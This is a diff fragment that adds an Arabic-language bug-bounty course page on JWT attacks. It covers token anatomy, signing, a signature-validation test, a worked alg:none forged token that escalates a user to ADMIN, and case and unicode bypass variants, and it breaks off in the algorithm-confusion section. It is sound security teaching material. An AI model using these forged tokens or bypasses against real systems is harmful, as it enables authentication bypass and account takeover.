+        <a class="nav-link" href="#s4">التوقيع</a>
+        <a class="nav-link" href="#s5">HMAC vs RSA</a>
+        <a class="nav-link" href="#s6">None Attack</a>
+        <a class="nav-link" href="#s7">Alg Confusion</a>
+        <a class="nav-link" href="#s8">Weak Secrets</a>
+        <a class="nav-link" href="#s9">Header Injections</a>
+        <a class="nav-link" href="#s10">Claim Manipulation</a>
+        <a class="nav-link" href="#s11">Decode vs Verify</a>
+        <a class="nav-link" href="#s12">Methodology</a>
+        <a class="nav-link" href="#s13">Decision Trees</a>
+        <a class="nav-link" href="#s14">Cheatsheet</a>
+        <a class="nav-link" href="#s15">Quiz</a>
+    </div>
+</nav>
+
+<!-- ═══ S1: WHAT IS JWT ═══ -->
+<section class="section" id="s1" style="padding-top:8rem">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 01 — المبدأ الأساسي</div>
+            <h2 class="sec-title">الـ JWT — <em>إيه هو بالظبط؟</em></h2>
+            <p class="sec-desc">الفرق بين الـ Stateful والـ Stateless — وليه الـ JWT هو الـ attack surface الأساسية
+                في كل API حديثة.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="g2 rev" style="margin-bottom:2rem">
+            <div class="card cd">
+                <div class="clabel">🏛️ الطريقة القديمة — STATEFUL</div>
+                <h3>Session-Based Auth</h3>
+                <p style="margin-bottom:1rem">الـ server بيعمل session في الـ DB أو Redis وبيديك session ID في الـ
+                    cookie. كل request — database lookup.</p>
+                <div class="cb">
+                    <span class="cb-lbl">// SESSION FLOW</span>
+                    <span class="t">POST</span> <span class="w">/login</span>
+                    <span class="m">↓ Creates: sessions table row</span>
+                    <span class="m">↓ Set-Cookie: sid=abc123xyz</span>
+
+                    <span class="t">GET</span> <span class="w">/dashboard</span>
+                    <span class="m">Cookie: sid=abc123xyz</span>
+                    <span class="m">↓ SELECT * FROM sessions</span>
+                    <span class="m"> WHERE id = 'abc123xyz'</span>
+                    <span class="gr">↓ Found → Authenticated ✅</span>
+                </div>
+            </div>
+            <div class="card cr">
+                <div class="clabel">🚀 الطريقة الجديدة — STATELESS</div>
+                <h3>JWT-Based Auth</h3>
+                <p style="margin-bottom:1rem">الـ server بيعمل JWT مكتوب فيه كل المعلومات. مفيش DB lookup — بيتحقق
+                    من الـ signature بس.</p>
+                <div class="cb">
+                    <span class="cb-lbl">// JWT FLOW</span>
+                    <span class="t">POST</span> <span class="w">/login</span>
+                    <span class="m">↓ Creates: JWT token</span>
+                    <span class="m">↓ Response: eyJhbGc...(token)</span>
+
+                    <span class="t">GET</span> <span class="w">/dashboard</span>
+                    <span class="m">Authorization: Bearer eyJhbGc...</span>
+                    <span class="r">↓ verify(signature) ONLY</span>
+                    <span class="gr">↓ Valid → Authenticated ✅</span>
+                    <span class="r">↓ NO database lookup needed</span>
+                </div>
+            </div>
+        </div>
+        <div class="sb rev">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — ليه الـ JWT هو الـ Target في Bug Bounty</span><span
+                    class="sb-time">0:00 – 6:00</span></div>
+            <div class="sb-body">
+                <p>السؤال اللي لازم تسأله: لو الـ server مش بيعمل database lookup — <span class="hl">إزاي بيتأكد إن
+                        الـ token ما اتغيرش؟</span> الإجابة هي الـ Cryptographic Signature.</p>
+                <p>والسؤال التاني: لو الـ attacker قدر يغير الـ token أو يعمل token جديد بدون الـ secret key — <span
+                        class="hl">إيه اللي هيحصل؟</span> هيقدر يتحول لأي user في السيستم — حتى الـ admin.</p>
+                <div class="nb">🎯 الـ JWT bugs من أعلى الـ impact في الـ bug bounty: بتؤدي دايماً لـ Authentication
+                    Bypass أو Account Takeover كامل. الـ CVSS score بيكون 9.0+ في معظم الحالات.</div>
+                <p>الـ JWT مش بس token — هو التعاقد المكتوب بين الـ client والـ server. لو قدرت تزور التوقيع، <span
+                        class="hl">الـ contract بقى بتاعتك</span>.</p>
+            </div>
+        </div>
+        <div class="g3 rev" style="margin-top:2rem">
+            <div class="card cr">
+                <div class="clabel">📍 Authorization Header</div>
+                <p style="font-size:.87rem;margin-bottom:.8rem">الأكتر شيوعاً في APIs:</p>
+                <div class="cb" style="font-size:.62rem;padding:.9rem"><span class="t">Authorization:</span><br><span
+                        class="w"> Bearer eyJhbGci...</span></div>
+            </div>
+            <div class="card cr">
+                <div class="clabel">🍪 Cookie Header</div>
+                <p style="font-size:.87rem;margin-bottom:.8rem">بعض التطبيقات تحط الـ JWT في Cookie:</p>
+                <div class="cb" style="font-size:.62rem;padding:.9rem"><span class="t">Cookie:</span> <span
+                        class="w">jwt=eyJhbGc...</span><br><span class="t">Cookie:</span> <span
+                        class="w">token=eyJhb...</span></div>
+            </div>
+            <div class="card cr">
+                <div class="clabel">🔗 URL Parameter</div>
+                <p style="font-size:.87rem;margin-bottom:.8rem">Anti-pattern خطير — بيظهر في الـ logs:</p>
+                <div class="cb" style="font-size:.62rem;padding:.9rem"><span class="t">GET</span> <span
+                        class="w">/file?token=eyJh...</span><br><span class="r">// بيتسجل في server logs</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S2: ANATOMY ═══ -->
+<section class="section" id="s2">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 02 — التشريح الكامل</div>
+            <h2 class="sec-title">الـ JWT — <em>الأجزاء الثلاثة</em></h2>
+            <p class="sec-desc">قبل ما تهاجم أي حاجة لازم تفهم الـ structure. كل جزء ليه دور مختلف — وكل جزء له
+                attack vector مختلف.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="jwt-visual rev">
+            <div class="jwt-tok">
+                <span class="jt-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="jt-d">.</span><span
+                    class="jt-p">eyJ1c2VySWQiOiI4ODAwMzI3Iiwicm9sZSI6InVzZXIiLCJlbWFpbCI6ImFyc29uQGhhY2tlci5vbmUiLCJpYXQiOjE3MzIwMDAwMDAsImV4cCI6MTczMjA4NjQwMH0</span><span
+                    class="jt-d">.</span><span class="jt-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+            </div>
+            <div class="jwt-decoded">
+                <div class="jdp jdp-h">
+                    <div class="jdp-label">⬡ HEADER — الـ Metadata</div>
+                    <div class="jdp-code">{
+                        "alg": "HS256",
+                        "typ": "JWT"
+                        }</div>
+                </div>
+                <div class="jdp jdp-p">
+                    <div class="jdp-label">⬡ PAYLOAD — الـ Claims</div>
+                    <div class="jdp-code">{
+                        "userId": "8800327",
+                        "role": "user",
+                        "email": "arson@hacker.one",
+                        "iat": 1732000000,
+                        "exp": 1732086400
+                        }</div>
+                </div>
+                <div class="jdp jdp-s">
+                    <div class="jdp-label">⬡ SIGNATURE — الضمان</div>
+                    <div class="jdp-code">HMACSHA256(
+                        base64url(header)
+                        + "."
+                        + base64url(payload),
+                        SECRET_KEY
+                        )</div>
+                </div>
+            </div>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — دور كل جزء</span><span class="sb-time">6:00 –
+                    16:00</span></div>
+            <div class="sb-body">
+                <p>الـ <span class="hl">Header</span>: بيقول "أنا JWT وبيتحقق مني باستخدام HS256". الـ <span
+                        class="ic">alg</span> field هو أول حاجة الـ server بيشوفها — وهو الـ attack surface الأولى.
+                </p>
+                <p>الـ <span class="hl3">Payload</span>: بيحتوي على الـ Claims — الادعاءات عن الـ user. في Claims
+                    مقننة زي <span class="ic">exp</span> (expiration)، <span class="ic">sub</span> (user ID)، وفي
+                    Claims خاصة بالتطبيق زي <span class="ic">role</span> أو <span class="ic">isAdmin</span>.</p>
+                <p>الـ <span class="hl2">Signature</span>: هو الحارس. بدونه — الـ payload مجرد JSON ممكن يغيره أي
+                    حد. معاه — الـ server يتأكد إن الـ token ما اتلعبش فيه.</p>
+                <div class="wb">⚠️ الجزء الأهم: الـ alg field في الـ header مش مضمون — ده هو قلب الـ JWT attacks.
+                    الـ server في أغلب الأحيان بيثق في اللي المهاجم كتبه في الـ header!</div>
+            </div>
+        </div>
+        <div class="rev" style="overflow-x:auto;margin-top:2rem">
+            <h3 style="font-family:'Cormorant Garamond',serif;font-size:1.5rem;color:var(--cream);margin-bottom:1.2rem">
+                الـ Registered Claims — RFC 7519</h3>
+            <table class="dt2">
+                <thead>
+                    <tr>
+                        <th style="direction:ltr">Claim</th>
+                        <th>الاسم</th>
+                        <th>الوظيفة</th>
+                        <th>أهميته للـ Attacker</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">sub</td>
+                        <td>Subject</td>
+                        <td>الـ user ID</td>
+                        <td><span class="pb crit">CRITICAL</span> — تغييره = ATO مباشر</td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">exp</td>
+                        <td>Expiration</td>
+                        <td>متى الـ token بينتهي</td>
+                        <td><span class="pb high">HIGH</span> — رفعه = token لا ينتهي</td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">aud</td>
+                        <td>Audience</td>
+                        <td>الـ service اللي الـ token معمول ليه</td>
+                        <td><span class="pb high">HIGH</span> — cross-service replay</td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">iss</td>
+                        <td>Issuer</td>
+                        <td>مين أصدر الـ token</td>
+                        <td><span class="pb med">MEDIUM</span></td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">jti</td>
+                        <td>JWT ID</td>
+                        <td>Unique ID للـ token</td>
+                        <td><span class="pb med">MEDIUM</span> — replay attacks</td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">iat</td>
+                        <td>Issued At</td>
+                        <td>إمتى اتعمل</td>
+                        <td><span class="pb">LOW</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S3: BASE64 ≠ ENCRYPTION ═══ -->
+<section class="section" id="s3">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 03 — الغلطة الأشهر</div>
+            <h2 class="sec-title">Base64 <em>≠</em> Encryption</h2>
+            <p class="sec-desc">أهم مفهوم في الـ JWT — الـ payload مكشوف دايماً ومقروء من أي حد.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="g2 rev">
+            <div class="card cd">
+                <div class="clabel">❌ الفهم الغلط</div>
+                <h3>الـ Payload متشفر؟</h3>
+                <p style="margin-bottom:1rem">كتير من الـ developers بيفتكروا إن الـ JWT payload "متشفر" لأنه شايف
+                    حروف عشوائية. ده خطأ فادح.</p>
+                <div class="cb" style="font-size:.67rem">
+                    <span class="cb-lbl">// LOOKS ENCRYPTED?</span>
+                    <span class="r">eyJ1c2VySWQiOiI4ODAwMzI3Iiw</span>
+                    <span class="r">icm9sZSI6ImFkbWluIn0</span>
+
+                    <span class="m">// Let's decode it...</span>
+                    <span class="t">echo</span> <span class="w">"eyJ1c2VySWQiOiI4O..." | base64 -d</span>
+                    <span class="r">// Result:</span>
+                    <span class="gr">// {"userId":"8800327","role":"admin"}</span>
+                </div>
+            </div>
+            <div class="card ct">
+                <div class="clabel t">✅ الحقيقة</div>
+                <h3>Base64 = Encoding فقط</h3>
+                <p style="margin-bottom:.8rem">Encoding = تحويل format بدون مفتاح.<br>Encryption = تشفير يحتاج مفتاح
+                    للفك.</p>
+                <div class="cb" style="font-size:.67rem">
+                    <span class="cb-lbl">// 3 WAYS TO DECODE</span>
+                    <span class="m">// Terminal:</span>
+                    <span class="t">echo</span> <span class="y">"eyJhbGciOiJIUzI1NiJ9"</span> <span class="w">|
+                        base64 -d</span>
+                    <span class="gr">// {"alg":"HS256"}</span>
+
+                    <span class="m">// Browser Console:</span>
+                    <span class="w">atob(</span><span class="y">"eyJhbGciOiJIUzI1NiJ9"</span><span class="w">)</span>
+                    <span class="gr">// {"alg":"HS256"}</span>
+
+                    <span class="m">// jwt.io → paste → decoded instantly</span>
+                    <span class="gr">// NO key needed. Anyone can read it.</span>
+                </div>
+            </div>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — الـ Payload مكشوف دايماً</span><span
+                    class="sb-time">16:00 – 22:00</span></div>
+            <div class="sb-body">
+                <p>ده معناه إن أي حد يقدر يقرأ الـ payload — حتى لو الـ signature صح. المعلومات زي الـ userId والـ
+                    role والـ email — كلها <span class="hl">plain text</span> لأي حد يعترض الـ token.</p>
+                <p>لكن <span class="hl">قراءة</span> الـ payload مختلفة عن <span class="hl2">تعديله</span>. لو غيرت
+                    الـ payload — الـ signature هتبقى مش بتطابق. الـ server هيرفض. ده الأمان الحقيقي.</p>
+                <div class="nb">💡 الـ Security في الـ JWT مش في "إخفاء" الـ payload — هو في <strong
+                        style="color:var(--cream)">ضمان سلامته</strong>. الاستثناء الوحيد: الـ JWE (JSON Web
+                    Encryption) بيشفر الـ payload فعلاً — بس ده نادر الاستخدام. 99% من الـ JWTs في Bug Bounty = JWS
+                    (Signed) مش JWE.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S4: HOW SIGNATURE WORKS ═══ -->
+<section class="section" id="s4">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 04 — الكريبتوغرافي</div>
+            <h2 class="sec-title">كيف يعمل <em>التوقيع؟</em></h2>
+            <p class="sec-desc">فهم الـ signature هو مفتاح فهم كل الـ attacks. كل attack بتستغل weakness في كيفية
+                التحقق من التوقيع.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="sb rev">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — الـ HMAC Formula خطوة بخطوة</span><span
+                    class="sb-time">22:00 – 35:00</span></div>
+            <div class="sb-body">
+                <p>الـ signature عبارة عن <span class="hl">hash function</span> بياخد input وبيطلع output ثابت. الـ
+                    input هو الـ header والـ payload مع بعض، والـ function هي الـ HMAC-SHA256.</p>
+                <p>الفكرة الأساسية: لو غيرت أي byte في الـ input — الـ output (الـ signature) هيتغير تماماً. ده
+                    بيعني إن أي تعديل على الـ payload هيكشفه الـ server فوراً لما يتحقق.</p>
+            </div>
+        </div>
+        <div class="formula-box rev">
+            <span style="color:var(--muted)">// ─── HMAC-SHA256 SIGNATURE GENERATION
+                ───────────────────────────</span>
+
+            <span class="arg">headerB64</span> <span class="op">=</span> <span class="fn">base64url</span>(<span
+                class="concat">{"alg":"HS256","typ":"JWT"}</span>)
+            <span class="arg">payloadB64</span> <span class="op">=</span> <span class="fn">base64url</span>(<span
+                class="concat">{"userId":"8800327","role":"user"}</span>)
+            <span class="arg">message</span> <span class="op">=</span> <span class="arg">headerB64</span> <span
+                class="op">+</span> <span class="concat">"."</span> <span class="op">+</span> <span
+                class="arg">payloadB64</span>
+
+            <span class="out">signature</span> <span class="op">=</span> <span class="fn">HMAC</span>(<span
+                class="key">SHA256</span>, <span class="arg">message</span>, <span class="key">SECRET_KEY</span>)
+
+            <span style="color:var(--muted)">// ─── VERIFICATION (Server Side)
+                ──────────────────────────────────</span>
+
+            <span class="arg">expected_sig</span> <span class="op">=</span> <span class="fn">HMAC</span>(<span
+                class="key">SHA256</span>, <span class="arg">headerB64</span>+<span class="concat">"."</span>+<span
+                class="arg">payloadB64</span>, <span class="key">SECRET_KEY</span>)
+            <span class="arg">provided_sig</span> <span class="op">=</span> <span
+                class="concat">SflKxwRJSMeKKF2QT4fwpMeJf36...</span>
+
+            <span style="color:var(--muted)">// Compare:</span>
+            <span style="color:var(--red)">if</span> <span class="arg">expected_sig</span> <span class="op">!==</span>
+            <span class="arg">provided_sig</span> <span style="color:var(--red)">→</span>
+            <span style="color:var(--red)">401 Unauthorized</span>
+            <span style="color:var(--green)">if</span> <span class="arg">expected_sig</span> <span class="op">===</span>
+            <span class="arg">provided_sig</span> <span style="color:var(--green)">→</span> <span
+                style="color:var(--green)">200 OK ✅</span>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — ليه الـ SECRET_KEY هو كل حاجة</span><span
+                    class="sb-time">35:00 – 44:00</span></div>
+            <div class="sb-body">
+                <p>الـ SECRET_KEY هو الفرق بين تطبيق آمن وتطبيق قابل للاختراق. <span class="hl">بدون الـ
+                        secret</span> — المهاجم يقدر يشوف الـ payload بس مش يقدر يعمل signature صح.</p>
+                <p>لو المهاجم عنده الـ secret — خلاص. هيقدر يعمل أي token عايزه بأي claims. لو الـ secret ضعيف —
+                    يقدر يخمنه بـ hashcat. لو التحقق مش موجود أصلاً — مش محتاج الـ secret خالص.</p>
+                <div class="nb">🔑 الـ Secret Key المثالي: 256+ bit من الـ random bytes (مش كلمة زي "secret" أو
+                    "admin123"). لازم تتعمل بـ cryptographic random number generator — مش بإيدك.</div>
+                <p>الـ test الأساسي لكل JWT: <span class="hl">شيل آخر حرف من الـ signature</span> وبعت الـ request.
+                    لو رجع 200 — الـ signature مش validated. لو رجع 401 — الـ signature validated وعندنا attack
+                    vectors تانية.</p>
+            </div>
+        </div>
+        <div class="attack-box rev">
+            <div class="attack-hd"><span class="attack-name">⚡ SIGNATURE VALIDATION TEST</span><span
+                    class="attack-sev">أول حاجة تعملها</span></div>
+            <div class="attack-body">
+                <div class="cb" style="margin-bottom:1rem">
+                    <span class="cb-lbl">// TEST: IS SIGNATURE VALIDATED?</span>
+                    <span class="m">// Original JWT:</span>
+                    <span class="w">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI4ODAifQ.</span><span
+                        class="r">SflKxwRJSMeKKF2QT4fwpMeJf36POk6y</span>
+
+                    <span class="m">// Remove last character from signature:</span>
+                    <span class="w">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI4ODAifQ.</span><span
+                        class="g">SflKxwRJSMeKKF2QT4fwpMeJf36POk6</span>
+
+                    <span class="m">// Send to server and check response:</span>
+                    <span class="gr">200 OK → ⚡ Signature NOT validated → Jackpot!</span>
+                    <span class="r">401 → Signature IS validated → Use other attacks</span>
+                </div>
+                <p>لو الـ signature مش validated — تقدر تغير أي claim في الـ payload وبعته وهيشتغل. ده الـ ATO أبسط
+                    طريقة.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S5: HMAC vs RSA ═══ -->
+<section class="section" id="s5">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 05 — نوعا التوقيع</div>
+            <h2 class="sec-title">HMAC <em>vs</em> RSA — الفرق الجوهري</h2>
+            <p class="sec-desc">نوع الـ algorithm بيحدد الـ attack vectors المتاحة لك. لازم تعرف الفرق قبل ما تبدأ.
+            </p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="g2 rev">
+            <div class="card cr">
+                <div class="clabel">⚡ SYMMETRIC — HS256 / HS384 / HS512</div>
+                <h3>نفس المفتاح للتوقيع والتحقق</h3>
+                <p style="margin-bottom:1rem">الـ server يستخدم <strong style="color:var(--cream)">نفس الـ
+                        SECRET_KEY</strong> عشان يوقع ويتحقق. ده معناه:</p>
+                <ul class="cl">
+                    <li><span class="tg">Risk</span> لو الـ secret اتسرب — أي حد يقدر يزور tokens</li>
+                    <li><span class="tg">Risk</span> لو الـ secret ضعيف — hashcat هيكسره في دقائق</li>
+                    <li><span class="tg">Attack</span> الـ Algorithm Confusion attack ممكن</li>
+                    <li><span class="tg">Note</span> أبسط implementation — لذلك الأكثر انتشاراً</li>
+                </ul>
+                <div class="cb" style="margin-top:1rem;font-size:.67rem">
+                    <span class="cb-lbl">// HS256 FLOW</span>
+                    <span class="m">// Sign:</span>
+                    <span class="t">sig</span> = HMAC(SHA256, msg, <span class="key">secret</span>)
+
+                    <span class="m">// Verify:</span>
+                    <span class="t">ok</span> = HMAC(SHA256, msg, <span class="key">same secret</span>) == sig
+                </div>
+            </div>
+            <div class="card ct">
+                <div class="clabel t">🔐 ASYMMETRIC — RS256 / ES256 / PS256</div>
+                <h3>مفتاح خاص للتوقيع، عام للتحقق</h3>
+                <p style="margin-bottom:1rem">الـ server يوقع بالـ <strong style="color:var(--cream)">private
+                        key</strong> ويعطي الـ <strong style="color:var(--cream)">public key</strong> لأي حد عشان
+                    يتحقق. ده معناه:</p>
+                <ul class="cl">
+                    <li><span class="tg t">Safer</span> الـ private key ما بيتشارش أبداً</li>
+                    <li><span class="tg t">Safer</span> الـ public key عام ومش سر</li>
+                    <li><span class="tg">Attack</span> الـ Algorithm Confusion هو الـ main vector</li>
+                    <li><span class="tg">Attack</span> الـ jku / jwk injection ممكن</li>
+                </ul>
+                <div class="cb" style="margin-top:1rem;font-size:.67rem">
+                    <span class="cb-lbl">// RS256 FLOW</span>
+                    <span class="m">// Sign (private key only):</span>
+                    <span class="t">sig</span> = RSA_sign(msg, <span class="key">private_key</span>)
+
+                    <span class="m">// Verify (public key — shareable!):</span>
+                    <span class="t">ok</span> = RSA_verify(msg, sig, <span class="g2">public_key</span>)
+                </div>
+            </div>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — اكتشاف الـ Algorithm</span><span class="sb-time">44:00
+                    – 52:00</span></div>
+            <div class="sb-body">
+                <p>أول لحظة تشوف JWT — افتح jwt.io وشوف الـ <span class="hl">alg field</span> في الـ header. ده
+                    بيحدد بالظبط إيه الـ attacks المتاحة.</p>
+                <p>لو <span class="hl">HS256</span>: جرب الـ algorithm confusion (RS256 → HS256)، وجرب تعمل brute
+                    force على الـ secret بالـ hashcat. لو <span class="hl2">RS256</span>: فكر في الـ jku injection،
+                    الـ jwk injection، والـ kid path traversal.</p>
+                <div class="nb">📝 Pointer مهم: لو شايف HS256 في تطبيق كبير — ده ممكن يكون legacy implementation أو
+                    technical debt. الـ developers الـ modern بيستخدموا RS256/ES256. HS256 بيعني ممكن في weak
+                    secret.</div>
+            </div>
+        </div>
+        <div class="rev" style="overflow-x:auto;margin-top:2rem">
+            <table class="dt2">
+                <thead>
+                    <tr>
+                        <th>Algorithm</th>
+                        <th>النوع</th>
+                        <th>الـ Attack Vectors</th>
+                        <th>الأولوية</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">
+                            HS256/384/512</td>
+                        <td>Symmetric (HMAC)</td>
+                        <td>alg:none، Algorithm Confusion، Weak Secret Brute Force</td>
+                        <td><span class="pb crit">HIGHEST</span></td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">
+                            RS256/384/512</td>
+                        <td>Asymmetric (RSA)</td>
+                        <td>Algorithm Confusion، jku injection، jwk injection، kid injection</td>
+                        <td><span class="pb high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">
+                            ES256/384/512</td>
+                        <td>Asymmetric (ECDSA)</td>
+                        <td>jku injection، jwk injection، kid injection</td>
+                        <td><span class="pb high">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td style="direction:ltr;font-family:'JetBrains Mono',monospace;color:var(--red)">none</td>
+                        <td>No Signature</td>
+                        <td>مباشرة قابل للتزوير</td>
+                        <td><span class="pb crit">CRITICAL</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S6: NONE ALGORITHM ATTACK ═══ -->
+<section class="section" id="s6">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 06 — أبسط الـ Attacks</div>
+            <h2 class="sec-title">الـ None Algorithm <em>Attack</em></h2>
+            <p class="sec-desc">الـ JWT spec بيسمح بـ "none" كـ algorithm — معناه مفيش signature. لو الـ server قبله
+                — الـ game over.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="attack-box rev">
+            <div class="attack-hd"><span class="attack-name">💀 NONE ALGORITHM ATTACK — alg:none</span><span
+                    class="attack-sev sev-crit">CRITICAL — Auth Bypass</span></div>
+            <div class="attack-body">
+                <p>الـ JWT spec الأصلي بيتيح الـ <span class="ic">none</span> algorithm للحالات اللي مفيهاش حاجة
+                    تتحقق منها. بس لو الـ server قبل الـ none algorithm من الـ client — أي حد يقدر يعمل token من غير
+                    signature.</p>
+            </div>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — الـ None Attack خطوة بخطوة</span><span
+                    class="sb-time">52:00 – 68:00</span></div>
+            <div class="sb-body">
+                <p>الـ attack بسيط جداً: خد الـ JWT الأصلي، غير الـ alg في الـ header لـ "none"، غير الـ payload زي
+                    ما تحب، واشيل الـ signature — بس خلي الـ dot الأخير موجود!</p>
+            </div>
+        </div>
+        <div class="cb rev">
+            <span class="cb-lbl">// STEP 1: ORIGINAL TOKEN</span>
+            <span class="r">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="m">.</span><span
+                class="g">eyJ1c2VySWQiOiI4ODAiLCJyb2xlIjoidXNlciJ9</span><span class="m">.</span><span
+                class="t">SflKxwRJSMeKKF2QT4</span>
+
+            <span class="m">// Decoded header: {"alg":"HS256","typ":"JWT"}</span>
+            <span class="m">// Decoded payload: {"userId":"880","role":"user"}</span>
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 2: CRAFT ATTACK TOKEN</span>
+            <span class="m">// New header: {"alg":"none","typ":"JWT"}</span>
+            <span class="m">// → base64url encode it:</span>
+            <span class="r">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span>
+
+            <span class="m">// New payload: {"userId":"880","role":"ADMIN"}</span>
+            <span class="m">// → base64url encode it:</span>
+            <span class="g">eyJ1c2VySWQiOiI4ODAiLCJyb2xlIjoiQURNSU4ifQ</span>
+
+            <span class="m">// No signature — but KEEP the trailing dot!</span>
+            <span class="t"> ← empty sig</span>
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 3: FINAL ATTACK TOKEN</span>
+            <span class="r">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span><span class="m">.</span><span
+                class="g">eyJ1c2VySWQiOiI4ODAiLCJyb2xlIjoiQURNSU4ifQ</span><span class="m">.</span>
+            <span class="m"> ↑ trailing dot REQUIRED</span>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — Bypass Filters</span><span class="sb-time">68:00 –
+                    78:00</span></div>
+            <div class="sb-body">
+                <p>بعض الـ implementations بيبلوكوا الـ "none" string. بس كتير من الـ libraries بتعمل
+                    case-insensitive comparison أو مش بتتحقق من كل الـ variations:</p>
+                <div class="cb" style="font-size:.68rem">
+                    <span class="cb-lbl">// NONE ALGORITHM BYPASS VARIATIONS</span>
+                    <span class="g">"alg": "none"</span> <span class="m">← standard</span>
+                    <span class="g">"alg": "None"</span> <span class="m">← capital N bypass</span>
+                    <span class="g">"alg": "NONE"</span> <span class="m">← all caps bypass</span>
+                    <span class="g">"alg": "nOnE"</span> <span class="m">← mixed case bypass</span>
+                    <span class="g">"alg": ""</span> <span class="m">← empty string bypass</span>
+                    <span class="g">"alg": "n\u006Fne"</span> <span class="m">← unicode escape bypass</span>
+                </div>
+                <div class="nb">⚠️ الـ Fix الصحيح: الـ server لازم يحدد الـ expected algorithms بشكل explicit في الـ
+                    code، مش يقرأ الـ algorithm من الـ header. الـ server هو اللي يقرر — مش الـ client.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S7: ALGORITHM CONFUSION ═══ -->
+<section class="section" id="s7">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 07 — الـ Attack الأذكى</div>
+            <h2 class="sec-title">Algorithm Confusion — <em>RS256 → HS256</em></h2>
+            <p class="sec-desc">الأذكى والأكثر تأثيراً. بتخلي الـ server يتحقق من الـ signature بالـ public key كـ
+                HMAC secret.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="attack-box rev">
+            <div class="attack-hd"><span class="attack-name">🧠 ALGORITHM CONFUSION ATTACK</span><span
+                    class="attack-sev sev-crit">CRITICAL — CVE-2015-9235 family</span></div>
+            <div class="attack-body">
+                <p>الـ server عنده كود زي ده: <span class="ic">jwt.verify(token, key)</span>. لو الـ server عامل
+                    RS256 — الـ key المفروض يكون الـ public key. بس لو المهاجم غير الـ alg لـ HS256 — الـ library
+                    هتستخدم الـ public key كـ HMAC secret. والـ attacker عنده الـ public key — هو public!</p>
+            </div>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — الـ Algorithm Confusion خطوة بخطوة</span><span
+                    class="sb-time">78:00 – 100:00</span></div>
+            <div class="sb-body">
+                <p>الـ scenario: التطبيق بيستخدم RS256. الـ public key متاح من endpoint زي <span
+                        class="ic">/.well-known/jwks.json</span> أو <span class="ic">/api/public-key</span>. المهاجم
+                    بيعمل الآتي:</p>
+                <p>يجيب الـ public key (هو public — مش سر). يبني JWT جديد بالـ header <span
+                        class="ic">{"alg":"HS256"}</span>. يوقع الـ token بـ الـ HMAC-SHA256 باستخدام الـ public key
+                    كـ secret. الـ server بيستلم الـ token، بيشوف <span class="ic">alg:HS256</span>، بيعمل verify
+                    بالـ public key كـ HMAC secret — ويتطابق!</p>
+                <div class="nb">🔑 الفكرة الذهبية: الـ server بيستخدم نفس الـ key في كل الحالتين. لما يشوف HS256
